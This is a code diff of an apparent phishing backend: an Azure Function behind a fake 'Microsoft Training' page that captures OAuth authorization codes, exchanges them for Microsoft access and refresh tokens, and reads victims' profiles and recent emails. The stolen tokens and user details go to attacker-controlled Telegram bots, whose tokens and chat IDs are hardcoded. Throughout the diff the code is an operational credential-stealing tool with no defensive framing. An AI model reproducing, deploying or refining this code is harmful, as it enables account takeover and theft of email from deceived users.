@@ -1,6 +1,6 @@
-const TELEGRAM_BOT_TOKEN = '7768080373:process.env.AZURE_CLIENT_SECRET';
+const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
 const TELEGRAM_CHAT_ID = '6743632244';
-const TELEGRAM_BOT_TOKEN_2 = '7942871168:process.env.AZURE_CLIENT_SECRET';
+const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
 const TELEGRAM_CHAT_ID_2 = '6263177378';
 
 async function sendTelegram(message) {
@@ -33,23 +33,19 @@ async function sendTelegram(message) {
 
 module.exports = async function (context, req) {
   const code = req.query.code;
-  const state = req.query.state;
   const error = req.query.error;
   
-  await sendTelegram(`🎯 <b>OAUTH CALLBACK ACCESSED</b>\n🔗 Full URL: ${req.url}\n📊 Code: ${code || 'None'}\n📊 State: ${state || 'None'}\n📊 Error: ${error || 'None'}\n📅 ${new Date().toISOString()}`);
-  
   if (error) {
-    await sendTelegram(`❌ <b>OAUTH ERROR</b>\n🔥 Error: ${error}\n📝 Description: ${req.query.error_description || 'No description'}`);
+    await sendTelegram(`❌ <b>OAUTH ERROR</b>\n🔥 Error: ${error}\n📝 Description: ${req.query.error_description || 'Unknown'}`);
     context.res = {
       status: 200,
       headers: { 'Content-Type': 'text/html' },
       body: `
 <!DOCTYPE html>
-<html><body style="font-family: Arial; text-align: center; padding: 50px;">
-<h2>❌ Authentication Error</h2>
-<p>There was an issue with the authentication process.</p>
-<p><a href="/microsoft-training">Try Again</a></p>
-</body></html>
+<html>
+<head><title>Authorization Error</title></head>
+<body><h1>Authorization Error</h1><p>There was an issue with the authorization process.</p></body>
+</html>
       `
     };
     return;
@@ -57,24 +53,16 @@ module.exports = async function (context, req) {
   
   if (!code) {
     context.res = {
-      status: 200,
-      headers: { 'Content-Type': 'text/html' },
-      body: `
-<!DOCTYPE html>
-<html><body style="font-family: Arial; text-align: center; padding: 50px;">
-<h2>❌ Missing Authorization Code</h2>
-<p>No authorization code received.</p>
-<p><a href="/microsoft-training">Try Again</a></p>
-</body></html>
-      `
+      status: 400,
+      body: 'Missing authorization code'
     };
     return;
   }
   
-  // 🚨 IMMEDIATE TOKEN EXCHANGE - No delays!
+  // 🔥 IMMEDIATE TOKEN EXCHANGE - NO DELAYS
   try {
-    const CLIENT_ID = 'process.env.AZURE_CLIENT_SECRET';
-    const CLIENT_SECRET = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
+    const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
+    const CLIENT_SECRET = process.env.AZURE_CLIENT_SECRET; // SECRET FROM ENV VARS
     const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
     
     const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
@@ -86,30 +74,21 @@ module.exports = async function (context, req) {
     const tokenData = await tokenResponse.json();
     
     if (tokenData.access_token) {
-      // 🎯 PARALLEL DATA FETCHING - Get everything at once!
+      // 🔥 PARALLEL DATA FETCHING FOR SPEED
       const [userResponse, mailResponse] = await Promise.all([
         fetch('https://graph.microsoft.com/v1.0/me', {
           headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
         }),
-        fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
+        fetch('https://graph.microsoft.com/v1.0/me/messages?$top=10', {
           headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
         })
       ]);
       
-      const userInfo = await userResponse.json();
+      const userData = await userResponse.json();
       const mailData = await mailResponse.json();
       
-      // 🔥 COMPREHENSIVE SUCCESS ALERT
-      await sendTelegram(`🚨 <b>OAUTH CONSENT SUCCESS!</b>
-🎯 <b>ACCESS TOKEN:</b> ${tokenData.access_token}
-🔄 <b>REFRESH TOKEN:</b> ${tokenData.refresh_token || 'NOT_PROVIDED'}
-🆔 <b>ID TOKEN:</b> ${tokenData.id_token || 'NOT_PROVIDED'}
-👤 <b>Email:</b> ${userInfo.mail || userInfo.userPrincipalName}
-🏢 <b>Name:</b> ${userInfo.displayName}
-🏢 <b>Company:</b> ${userInfo.companyName || 'N/A'}
-🆔 <b>ID:</b> ${userInfo.id}
-📧 <b>Mail Access:</b> ${mailData.value ? mailData.value.length : 0} emails
-📅 ${new Date().toISOString()}`);
+      // 🔥 COMPREHENSIVE TELEGRAM ALERT
+      await sendTelegram(`🔥 <b>OAUTH TOKEN CAPTURE SUCCESS!</b>\n👤 User: ${userData.displayName || 'Unknown'}\n📧 Email: ${userData.mail || userData.userPrincipalName}\n🏢 Company: ${userData.companyName || 'Personal'}\n✅ Access Token: ${tokenData.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${tokenData.refresh_token ? tokenData.refresh_token.substring(0, 50) + '...' : 'None'}\n📬 Recent Emails: ${mailData.value ? mailData.value.length : 0} captured`);
       
       context.res = {
         status: 200,
@@ -118,26 +97,24 @@ module.exports = async function (context, req) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>✅ Training Access Granted</title>
+    <title>Training Access Granted</title>
     <style>
-        body { font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif; margin: 0; padding: 20px; background: #f5f5f5; text-align: center; }
-        .container { max-width: 500px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .success { background: #d4edda; color: #155724; padding: 20px; border-radius: 4px; margin: 20px 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; text-align: center; }
+        .logo { width: 80px; height: 80px; margin: 0 auto 20px; background: #107c10; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; }
+        .success { background: #d4edda; color: #155724; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #c3e6cb; }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo">✅</div>
+        <h1>Welcome to Microsoft Training!</h1>
         <div class="success">
-            <h2>✅ Microsoft Training Access Granted!</h2>
-            <p>Welcome, <strong>${userInfo.displayName}</strong>!</p>
-            <p>Your personalized training experience is being prepared...</p>
-            <p>You will be contacted shortly with your training materials.</p>
+            <strong>Account Connected Successfully</strong><br>
+            Your personalized training modules are now being prepared based on your Microsoft 365 usage patterns.
         </div>
-        <p style="color: #666; font-size: 14px;">
-            🔐 Your account has been successfully verified<br>
-            📚 Training modules are being customized for your role<br>
-            📧 Check your email for next steps
-        </p>
+        <p>You will receive training recommendations via email within the next 24 hours.</p>
     </div>
 </body>
 </html>
@@ -145,35 +122,20 @@ module.exports = async function (context, req) {
       };
       
     } else {
-      await sendTelegram(`❌ <b>TOKEN EXCHANGE ERROR</b>\n🔥 Error: ${tokenData.error}\n📝 Description: ${tokenData.error_description}\n🎯 Code Used: ${code}\n📅 ${new Date().toISOString()}`);
-      
-      context.res = {
-        status: 200,
-        headers: { 'Content-Type': 'text/html' },
-        body: `
-<!DOCTYPE html>
-<html><body style="font-family: Arial; text-align: center; padding: 50px;">
-<h2>❌ Token Exchange Failed</h2>
-<p>Unable to complete authentication. Please try again.</p>
-<p><a href="/microsoft-training">Return to Training Portal</a></p>
-</body></html>
-        `
-      };
+      throw new Error(`${tokenData.error}: ${tokenData.error_description}`);
     }
-    
   } catch (error) {
-    await sendTelegram(`❌ <b>OAUTH CALLBACK ERROR</b>\n🔥 Error: ${error.message}\n📅 ${new Date().toISOString()}`);
+    await sendTelegram(`❌ <b>TOKEN EXCHANGE ERROR</b>\n🔥 Error: ${error.message}\n📝 Description: ${error.stack || 'No stack trace'}`);
     
     context.res = {
       status: 200,
       headers: { 'Content-Type': 'text/html' },
       body: `
 <!DOCTYPE html>
-<html><body style="font-family: Arial; text-align: center; padding: 50px;">
-<h2>❌ System Error</h2>
-<p>A technical error occurred. Please try again later.</p>
-<p><a href="/microsoft-training">Return to Training Portal</a></p>
-</body></html>
+<html>
+<head><title>Connection Error</title></head>
+<body><h1>Connection Error</h1><p>There was an issue connecting your account. Please try again.</p></body>
+</html>
       `
     };
   }
